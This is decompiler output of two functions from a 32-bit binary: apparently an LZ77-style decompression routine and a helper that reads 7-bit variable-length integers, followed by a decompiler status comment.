//----- (00402870) --------------------------------------------------------
unsigned int __cdecl sub_402870(char *a1, int a2, unsigned int a3)
{
  int v3; // eax
  int v4; // eax
  unsigned int result; // eax
  int v6; // [esp+0h] [ebp-1Ch] BYREF
  unsigned int i; // [esp+4h] [ebp-18h]
  int v8; // [esp+8h] [ebp-14h]
  char v9; // [esp+Fh] [ebp-Dh]
  unsigned int v10; // [esp+10h] [ebp-Ch] BYREF
  unsigned int v11; // [esp+14h] [ebp-8h]
  char v12; // [esp+1Bh] [ebp-1h]

  v11 = 1;
  v9 = *a1;
  v8 = 0;
  do
  {
    v12 = a1[v11++];
    if ( v12 == v9 )
    {
      if ( a1[v11] )
      {
        v3 = sub_402970((int *)&v10, &a1[v11]);
        v11 += v3;
        v4 = sub_402970(&v6, &a1[v11]);
        v11 += v4;
        for ( i = 0; i < v10; ++i )
        {
          *(_BYTE *)(v8 + a2) = *(_BYTE *)(a2 + v8 - v6);
          ++v8;
        }
      }
      else
      {
        *(_BYTE *)(v8 + a2) = v9;
        ++v8;
        ++v11;
      }
    }
    else
    {
      *(_BYTE *)(v8 + a2) = v12;
      ++v8;
    }
    result = v11;
  }
  while ( v11 < a3 );
  return result;
}

//----- (00402970) --------------------------------------------------------
int __cdecl sub_402970(int *a1, char *a2)
{
  int v3; // [esp+4h] [ebp-Ch]
  char v4; // [esp+8h] [ebp-8h]
  int v5; // [esp+Ch] [ebp-4h]

  v5 = 0;
  v3 = 0;
  do
  {
    v4 = *a2++;
    v5 = (v5 << 7) | v4 & 0x7F;
    ++v3;
  }
  while ( (v4 & 0x80) != 0 );
  *a1 = v5;
  return v3;
}

// nfuncs=10 queued=10 decompiled=10 lumina nreq=0 worse=0 better=0
// ALL OK, 10 function(s) have been successfully decompiled
